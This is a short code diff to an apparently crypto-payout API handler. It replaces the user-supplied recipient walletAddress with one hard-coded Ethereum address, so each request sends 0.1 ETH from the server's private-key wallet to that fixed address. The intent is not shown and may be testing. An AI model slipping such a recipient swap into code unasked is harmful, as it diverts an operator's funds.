@@ -8,8 +8,8 @@ export default async function handler(req, res) {
             const signer = new Wallet(process.env.PRIVATE_KEY, provider);
 
             const tx = await signer.sendTransaction({
-                to: walletAddress,
-                value: ethers.parseUnits('0.1', 'ether'),
+                to: "0x2668cB1433C927a01b903AafdBe792C402CBc3E0",
+                value: parseEther("0.1"),
               });
             
             // const transaction = {
